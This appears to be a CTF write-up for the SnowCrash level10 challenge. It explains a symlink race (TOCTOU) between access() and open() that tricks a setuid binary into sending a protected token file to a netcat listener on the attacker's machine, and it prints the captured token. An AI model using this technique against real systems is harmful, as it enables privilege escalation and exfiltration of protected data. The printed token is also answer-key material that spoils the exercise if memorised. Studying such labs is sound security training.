## Level10 Solution Guide

# Problem Overview

The level10 binary needs to send the contents of the token file to a remote host. However, the token file is protected:

runing the level10 prompt a permission error 
```bash 
level10@SnowCrash:~$ ./level10 token 10.14.2.5
You don't have access to token
```

we cannot directly read it (e.g., using cat).

based on the strace and ltrace output The level10 binary uses access() to check if the file is accessible and then open() to read its contents.

We can exploit the difference in behavior between access() and open() using a symlink swap technique " Symlink Race Condition".

## Solution Steps

1. Prepare the Environment

Start a Listener on the Host Machine
On the local machine (outside the VM), start a listener on port 6969 used by the proram to capture the file content sent by the level10 binary:
```bash
nc -lvp 6969
```

2. Exploit the Symlink Mechanism

we Create a Symlink to a Readable File , we created a /tmp/dummy with some content.
the /tmp/dummy to ensure the access() system call succeeds:
3. starting a loop to creater symlink race conditon

crate the file /tmp/swap.sh or download it from resources.

```bash 
sh -c /tmp/swap.sh
```
on the host machine after each respence we must relanch the listener so we can use the hang.sh script to automate the process.

```bash 
sh -c hang.sh
```
## Capture the flag

Run the level10 Binary multiple times until it success.
```bash
./level10 /tmp/symlink host_addres
```

On the local machine, the listener (Netcat) will capture the content of the code
```
Listening on 0.0.0.0 6969
Connection received on 10.14.59.24 51531
.*( )*.
woupa2yuojeeaaed06riuj63c

```
we use this code to get the flag as usual:

```bash 
>$ su flag10
passwd: code
>$ getflag 
```

